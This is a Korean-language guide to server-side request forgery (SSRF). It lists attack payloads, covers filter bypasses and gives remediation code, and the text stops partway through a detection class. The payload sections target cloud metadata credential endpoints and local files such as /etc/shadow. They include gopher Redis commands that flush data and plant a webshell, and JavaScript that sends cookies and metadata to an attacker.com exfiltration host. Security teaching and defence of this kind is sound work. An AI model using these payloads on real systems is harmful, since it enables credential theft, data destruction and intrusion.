# SSRF 취약점 가이드

## 목차
1. [정의&원리](#1-정의원리)
2. [기본 페이로드](#2-기본-페이로드)
3. [특수 페이로드](#3-특수-페이로드)
4. [조치 가이드](#4-조치-가이드)

---

## 1. 정의&원리

### SSRF(Server-Side Request Forgery)란?
웹 애플리케이션이 사용자가 제공한 URL로 HTTP 요청을 보내는 기능에서, 적절한 검증 없이 요청을 처리할 때 발생하는 취약점입니다. 공격자가 서버를 프록시로 사용하여 내부 네트워크나 외부 시스템에 무단 접근할 수 있습니다.

### SSRF 공격 유형

#### 1.1. 내부 네트워크 스캔 (Internal Network Scanning)
- 내부 IP 대역 스캔 (192.168.x.x, 10.x.x.x, 172.16-31.x.x)
- 내부 서비스 포트 스캔
- 클라우드 메타데이터 서비스 접근

#### 1.2. 로컬 파일 시스템 접근 (Local File Access)
- file:// 프로토콜을 통한 로컬 파일 읽기
- 설정 파일, 로그 파일 접근
- 소스 코드 노출

#### 1.3. 내부 서비스 악용 (Internal Service Abuse)
- 데이터베이스 직접 접근
- 캐시 서버 조작 (Redis, Memcached)
- 내부 API 호출

#### 1.4. 외부 시스템 공격 (External System Attack)
- 서버를 프록시로 사용한 외부 공격
- IP 우회를 통한 서비스 남용
- DDoS 공격 참여

### 공격 시나리오

#### 일반적인 SSRF 공격 시나리오:
1. **정찰**: URL 파라미터를 받는 기능 발견 (이미지 로딩, URL 미리보기 등)
2. **내부 스캔**: 내부 IP 대역 및 포트 스캔
3. **서비스 식별**: 발견된 내부 서비스 종류 파악
4. **권한 확장**: 클라우드 메타데이터나 내부 API를 통한 권한 획득
5. **데이터 탈취**: 내부 시스템에서 민감 정보 수집

### 일반적인 취약한 코드 패턴

#### 취약한 URL 가져오기 (Python):
```python
import requests

def fetch_url_content(url):
    # 사용자 입력 URL을 그대로 사용
    response = requests.get(url)
    return response.text

# 사용 예시
content = fetch_url_content("http://internal-service:8080/admin")
```

#### 취약한 이미지 프록시 (PHP):
```php
$image_url = $_GET['url'];
$image_data = file_get_contents($image_url);  // 검증 없이 요청
header('Content-Type: image/jpeg');
echo $image_data;
```

#### 취약한 웹훅 (Node.js):
```javascript
app.post('/webhook', (req, res) => {
    const callbackUrl = req.body.callback_url;
    
    // 사용자가 제공한 URL로 콜백 요청
    fetch(callbackUrl, {
        method: 'POST',
        body: JSON.stringify({result: 'success'})
    });
});
```

---

## 2. 기본 페이로드

### 2.1. 내부 네트워크 스캔

#### 2.1.1. 로컬호스트 접근
```bash
# 로컬호스트 변형
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
http://0/
http://127.1/
http://[::1]/
http://localhost.localdomain/

# 포트 스캔
http://127.0.0.1:22/     # SSH
http://127.0.0.1:3306/   # MySQL
http://127.0.0.1:5432/   # PostgreSQL
http://127.0.0.1:6379/   # Redis
http://127.0.0.1:11211/  # Memcached
http://127.0.0.1:9200/   # Elasticsearch
```

#### 2.1.2. 내부 IP 대역 스캔
```bash
# 사설 IP 대역
http://192.168.1.1/
http://192.168.0.1/
http://10.0.0.1/
http://172.16.0.1/
http://172.31.255.254/

# 일반적인 내부 서비스
http://192.168.1.100:8080/  # 내부 웹 서비스
http://10.0.0.5:9000/       # 내부 API
http://172.16.0.10:3000/    # 개발 서버
```

#### 2.1.3. 클라우드 메타데이터 접근
```bash
# AWS 메타데이터
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# Google Cloud 메타데이터
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure 메타데이터
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token

# Oracle Cloud 메타데이터
http://169.254.169.254/opc/v1/instance/
http://169.254.169.254/opc/v2/identity/cert.pem
```

### 2.2. 프로토콜 기반 공격

#### 2.2.1. file:// 프로토콜
```bash
# 로컬 파일 시스템 접근
file:///etc/passwd
file:///etc/shadow
file:///var/log/apache2/access.log
file:///proc/version
file:///proc/net/tcp

# Windows 파일 접근
file:///C:/windows/system32/drivers/etc/hosts
file:///C:/inetpub/wwwroot/web.config
file:///C:/windows/win.ini
```

#### 2.2.2. gopher:// 프로토콜
```bash
# Redis 명령 실행
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a

# HTTP 요청 구성
gopher://internal-api:8080/_GET%20/admin/users%20HTTP/1.1%0d%0aHost:%20internal-api:8080%0d%0a%0d%0a

# SMTP 명령 (메일 서버가 있는 경우)
gopher://127.0.0.1:25/_HELO%20localhost%0d%0aMAIL%20FROM:attacker@evil.com%0d%0aRCPT%20TO:victim@target.com%0d%0aDATA%0d%0aSubject:%20SSRF%20Test%0d%0a%0d%0aThis%20is%20a%20test%0d%0a.%0d%0aQUIT%0d%0a
```

#### 2.2.3. 기타 프로토콜
```bash
# FTP 접근
ftp://127.0.0.1/
ftp://internal-ftp:21/

# LDAP 접근
ldap://127.0.0.1:389/
ldaps://internal-ldap:636/

# dict:// 프로토콜 (포트 스캔)
dict://127.0.0.1:22/
dict://127.0.0.1:3306/
dict://192.168.1.1:80/
```

### 2.3. 내부 서비스 악용

#### 2.3.1. Redis 서버 공격
```bash
# Redis 정보 수집
http://127.0.0.1:6379/
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a

# Redis 명령 실행
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$9%0d%0abackdoor%0d%0a$12%0d%0amalicious_data%0d%0a

# 웹쉘 업로드 (Redis를 통해)
gopher://127.0.0.1:6379/_*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a
gopher://127.0.0.1:6379/_*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a
```

#### 2.3.2. Elasticsearch 공격
```bash
# 클러스터 정보 수집
http://127.0.0.1:9200/
http://127.0.0.1:9200/_cluster/health
http://127.0.0.1:9200/_nodes

# 인덱스 정보 수집
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/_all/_search

# 데이터 추출
http://127.0.0.1:9200/users/_search?q=*
http://127.0.0.1:9200/sensitive_data/_search?size=1000
```

#### 2.3.3. Docker API 공격
```bash
# Docker 데몬 접근
http://127.0.0.1:2376/version
http://unix:/var/run/docker.sock/containers/json

# 컨테이너 생성 및 실행
# POST 요청으로 새 컨테이너 생성
POST http://127.0.0.1:2376/containers/create
{
  "Image": "alpine",
  "Cmd": ["/bin/sh", "-c", "cat /etc/passwd"],
  "HostConfig": {
    "Binds": ["/:/mnt"]
  }
}
```

---

## 3. 특수 페이로드

### 3.1. URL 인코딩 우회

#### 3.1.1. IP 주소 우회
```bash
# 10진수 표현
http://2130706433/          # 127.0.0.1의 10진수
http://3232235521/          # 192.168.1.1의 10진수

# 8진수 표현
http://0177.0000.0000.0001/ # 127.0.0.1의 8진수
http://0300.0250.0001.0001/ # 192.168.1.1의 8진수

# 16진수 표현
http://0x7f000001/          # 127.0.0.1의 16진수
http://0xc0a80101/          # 192.168.1.1의 16진수

# 혼합 표현
http://127.0.0.1.xip.io/
http://localtest.me/
http://vcap.me/
```

#### 3.1.2. URL 인코딩 우회
```bash
# 기본 URL 인코딩
http://127.0.0.1/ → http%3A//127.0.0.1/
http://localhost/ → http%3A//localhost/

# 이중 URL 인코딩
http://127.0.0.1/ → http%253A//127.0.0.1/

# 부분 인코딩
http://127.0.0.1:80%2F
http://127.0.0.1%3A80/
http://127.0.0.1:80%2Fadmin
```

#### 3.1.3. 유니코드 우회
```bash
# 유니코드 도메인
http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/
http://𝐥𝐨𝐜𝐚𝐥𝐡𝐨𝐬𝐭/

# IDN (국제화 도메인명)
http://locałhost/         # Polish ł
http://localнost/         # Cyrillic н
```

### 3.2. 프로토콜 우회 및 악용

#### 3.2.1. 데이터 URL 스킴
```bash
# Base64 인코딩된 데이터
data:text/html;base64,PHNjcmlwdD5hbGVydCgnU1NSRicpPC9zY3JpcHQ+

# 직접 HTML 삽입
data:text/html,<script>fetch('http://attacker.com/exfiltrate?data='+document.cookie)</script>

# 리다이렉트 체인
data:text/html,<meta http-equiv="refresh" content="0;url=http://169.254.169.254/latest/meta-data/">
```

#### 3.2.2. JavaScript 및 VBScript
```bash
# JavaScript 프로토콜
javascript:fetch('http://169.254.169.254/latest/meta-data/').then(r=>r.text()).then(d=>fetch('http://attacker.com/?data='+btoa(d)))

# VBScript (IE 환경)
vbscript:msgbox("SSRF")
```

### 3.3. 블랙리스트 우회 기법

#### 3.3.1. DNS 리바인딩 공격
```javascript
// 공격자 도메인의 DNS 설정
// evil.com의 DNS 레코드:
// A record: evil.com → 1.2.3.4 (공격자 IP, TTL=0)
// 이후 A record: evil.com → 127.0.0.1 (내부 IP, TTL=0)

// 클라이언트 사이드 코드
function dnsRebindingAttack() {
    // 첫 번째 요청: 공격자 서버
    fetch('http://evil.com/setup')
    .then(() => {
        // DNS 캐시가 갱신된 후 내부 서버 접근
        setTimeout(() => {
            fetch('http://evil.com:8080/internal-api')
            .then(response => response.text())
            .then(data => {
                // 데이터를 공격자 서버로 전송
                fetch('http://attacker.com/exfiltrate', {
                    method: 'POST',
                    body: data
                });
            });
        }, 1000);
    });
}
```

#### 3.3.2. 도메인 혼동 공격
```bash
# 서브도메인 혼동
http://127.0.0.1.evil.com/      # evil.com의 서브도메인으로 위장
http://localhost.evil.com/

# TLD 혼동
http://127.0.0.1.evil/
http://localhost.malicious/

# 포트 혼동
http://evil.com:127.0.0.1/      # 잘못된 파싱 유도
```

#### 3.3.3. URL 파싱 혼동
```bash
# 스키마 혼동
httpp://127.0.0.1/
http:///127.0.0.1/
http:\\127.0.0.1\

# 호스트명 혼동
http://[::ffff:127.0.0.1]/      # IPv4-mapped IPv6
http://[::ffff:7f00:1]/
http://[::1]/                   # IPv6 루프백

# 사용자 정보 악용
http://expected-domain@127.0.0.1/
http://user:pass@127.0.0.1/
```

### 3.4. 고급 공격 기법

#### 3.4.1. HTTP 요청 스머글링 연계
```http
# HTTP/1.1 요청 스머글링과 SSRF 결합
POST /ssrf_endpoint HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: 127.0.0.1
X-Forwarded-For: 127.0.0.1
```

#### 3.4.2. 리다이렉트 체인 악용
```bash
# HTTP 302 리다이렉트를 통한 우회
http://attacker.com/redirect?url=http://169.254.169.254/latest/meta-data/

# 리다이렉트 서버 설정 예시 (공격자 서버)
# HTTP/1.1 302 Found
# Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### 3.5. 클라우드 환경 특화 공격

#### 3.5.1. AWS 메타데이터 서비스 공격
```bash
# 기본 메타데이터 수집
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4

# IAM 역할 정보 수집
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]

# 사용자 데이터 접근
http://169.254.169.254/latest/user-data/

# IMDSv2 토큰 획득 후 접근 (PUT 요청 필요)
# 1단계: 토큰 요청
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# 2단계: 토큰 사용
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: [TOKEN]
```

#### 3.5.2. Google Cloud 메타데이터 공격
```bash
# 기본 인스턴스 정보
http://metadata.google.internal/computeMetadata/v1/instance/
http://169.254.169.254/computeMetadata/v1/instance/name

# 서비스 계정 토큰 획득
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email

# 프로젝트 정보
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/attributes/

# 필수 헤더 포함
Metadata-Flavor: Google
```

---

## 4. 조치 가이드

### 4.1. 입력 검증 및 필터링

#### 4.1.1. URL 화이트리스트 구현
```python
import re
from urllib.parse import urlparse
import ipaddress

class SSRFProtection:
    def __init__(self):
        # 허용된 도메인 화이트리스트
        self.allowed_domains = {
            'api.example.com',
            'images.example.com',
            'cdn.example.com'
        }
        
        # 허용된 프로토콜
        self.allowed_protocols = {'http', 'https'}
        
        # 차단할 IP 대역
        self.blocked_networks = [
            ipaddress.ip_network('127.0.0.0/8'),    # 루프백
            ipaddress.ip_network('10.0.0.0/8'),     # 사설 A 클래스
            ipaddress.ip_network('172.16.0.0/12'),  # 사설 B 클래스
            ipaddress.ip_network('192.168.0.0/16'), # 사설 C 클래스
            ipaddress.ip_network('169.254.0.0/16'), # Link-local
            ipaddress.ip_network('224.0.0.0/4'),    # 멀티캐스트
        ]
    
    def validate_url(self, url):
        try:
            parsed = urlparse(url)
            
            # 프로토콜 검증
            if parsed.scheme not in self.allowed_protocols:
                raise ValueError(f"Protocol {parsed.scheme} not allowed")
            
            # 도메인 화이트리스트 검증
            if parsed.hostname not in self.allowed_domains:
                raise ValueError(f"Domain {parsed.hostname} not in whitelist")
            
            # IP 주소 차단 검증
            try:
                ip = ipaddress.ip_address(parsed.hostname)
                for blocked_network in self.blocked_networks:
                    if ip in blocked_network:
                        raise ValueError(f"IP {ip} is in blocked network")
            except ValueError:
                # 도메인명인 경우 DNS 해석 후 검증
                ip = self.resolve_domain_to_ip(parsed.hostname)
                if ip and self.is_blocked_ip(ip):
                    raise ValueError(f"Domain resolves to blocked IP: {ip}")
            
            return True
            
        except Exception as e:
            print(f"URL validation failed: {e}")
            return False
    
    def resolve_domain_to_ip(self, domain):
        try:
            import socket
            return socket.gethostbyname(domain)
        except socket.gaierror:
            return None
    
    def is_blocked_ip(self, ip_str):
        try:
            ip = ipaddress.ip_address(ip_str)
            return any(ip in network for network in self.blocked_networks)
        except ValueError:
            return True  # 파싱 실패 시 차단
```

### 4.2. 네트워크 레벨 보호

#### 4.2.1. 방화벽 규칙 설정
```bash
# iptables를 이용한 외부 요청 차단
# 웹 서버에서 내부 네트워크로의 요청 차단

# 내부 네트워크 접근 차단
iptables -A OUTPUT -s 웹서버IP -d 127.0.0.0/8 -j DROP
iptables -A OUTPUT -s 웹서버IP -d 10.0.0.0/8 -j DROP
iptables -A OUTPUT -s 웹서버IP -d 192.168.0.0/16 -j DROP
iptables -A OUTPUT -s 웹서버IP -d 172.16.0.0/12 -j DROP
iptables -A OUTPUT -s 웹서버IP -d 169.254.0.0/16 -j DROP

# 특정 포트만 허용
iptables -A OUTPUT -s 웹서버IP -p tcp --dport 80 -j ACCEPT
iptables -A OUTPUT -s 웹서버IP -p tcp --dport 443 -j ACCEPT
iptables -A OUTPUT -s 웹서버IP -p tcp --dport 53 -j ACCEPT

# 기본 정책을 DROP으로 설정
iptables -P OUTPUT DROP
```

### 4.3. 안전한 HTTP 클라이언트 구현

#### 4.3.1. Java 구현
```java
import java.net.http.HttpClient;
import java.time.Duration;

public class SecureHttpClient {
    private final HttpClient httpClient;
    private final SSRFProtection ssrfProtection;
    
    public SecureHttpClient() {
        this.httpClient = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(5))
            .followRedirects(HttpClient.Redirect.NEVER)  // 리다이렉트 차단
            .build();
        this.ssrfProtection = new SSRFProtection();
    }
    
    public String fetchURL(String url) throws Exception {
        // SSRF 검증
        if (!ssrfProtection.isValidURL(url)) {
            throw new SecurityException("SSRF attempt detected");
        }
        
        HttpRequest request = HttpRequest.newBuilder()
            .uri(URI.create(url))
            .timeout(Duration.ofSeconds(10))
            .header("User-Agent", "SecureBot/1.0")
            .GET()
            .build();
        
        HttpResponse<String> response = httpClient.send(
            request, 
            HttpResponse.BodyHandlers.ofString()
        );
        
        // 응답 크기 제한
        if (response.body().length() > 1024 * 1024) {  // 1MB 제한
            throw new SecurityException("Response too large");
        }
        
        return response.body();
    }
}
```

#### 4.3.2. Python 구현
```python
import requests
import socket
import ipaddress
from urllib.parse import urlparse

class SecureSSRFClient:
    def __init__(self):
        self.session = requests.Session()
        self.session.max_redirects = 0  # 리다이렉트 차단
        
        # 타임아웃 설정
        self.timeout = (5, 10)  # connect, read timeout
        
        # 허용된 도메인
        self.allowed_domains = {'api.trusted.com', 'cdn.example.com'}
        
    def safe_request(self, url, method='GET', **kwargs):
        # URL 검증
        if not self._validate_url(url):
            raise ValueError("URL validation failed")
        
        # DNS 해석 후 IP 검증
        parsed = urlparse(url)
        try:
            ip = socket.gethostbyname(parsed.hostname)
            if self._is_private_ip(ip):
                raise ValueError(f"Domain resolves to private IP: {ip}")
        except socket.gaierror:
            raise ValueError("DNS resolution failed")
        
        # 안전한 요청 실행
        response = self.session.request(
            method=method,
            url=url,
            timeout=self.timeout,
            allow_redirects=False,
            **kwargs
        )
        
        # 응답 크기 검증
        if len(response.content) > 1024 * 1024:  # 1MB 제한
            raise ValueError("Response too large")
        
        return response
    
    def _validate_url(self, url):
        try:
            parsed = urlparse(url)
            
            # 프로토콜 검증
            if parsed.scheme not in ['http', 'https']:
                return False
            
            # 도메인 화이트리스트 검증
            if parsed.hostname not in self.allowed_domains:
                return False
            
            return True
        except:
            return False
    
    def _is_private_ip(self, ip_str):
        try:
            ip = ipaddress.ip_address(ip_str)
            return ip.is_private or ip.is_loopback or ip.is_link_local
        except:
            return True
```

### 4.4. 클라우드 환경 보호

#### 4.4.1. AWS IMDSv2 강제 적용
```bash
# EC2 인스턴스에서 IMDSv1 비활성화
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-put-response-hop-limit 1

# Launch Template에서 IMDSv2 강제 설정
aws ec2 create-launch-template \
    --launch-template-name secure-template \
    --launch-template-data '{
        "MetadataOptions": {
            "HttpTokens": "required",
            "HttpPutResponseHopLimit": 1,
            "HttpEndpoint": "enabled"
        }
    }'
```

### 4.5. 모니터링 및 탐지

#### 4.5.1. SSRF 공격 탐지 시스템
```python
import re
import time
from collections import defaultdict
import logging

class SSRFAttackDetector:
    def __init__(self):
        self.suspicious_requests = defaultdict(list)
        self.logger = logging.getLogger(__name__)
        
        # SSRF 공격 패턴
        self.attack_patterns = [
            r'127\.0\.0\.1',
            r'localhost',
